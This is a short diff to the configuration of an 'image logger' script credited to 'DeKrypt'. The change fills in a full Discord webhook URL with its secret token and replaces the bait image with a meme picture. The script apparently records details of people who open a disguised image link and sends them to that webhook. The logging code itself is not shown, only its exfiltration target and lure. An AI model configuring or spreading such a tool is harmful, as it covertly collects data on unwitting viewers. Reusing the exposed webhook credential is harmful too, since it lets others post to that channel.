@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2016/08/avira_blog_mr.robot-header.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1518024079716651218/5e2fJ0U_kQhxgV578qcYAAqkmmkKwqbxFvNU1ym-WmDzCwQ8RrQeZlmktDQJmdXla06b",
+    "image": "https://wearedh.com/wp-content/uploads/2024/05/1-Memes-over-traditional-content.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
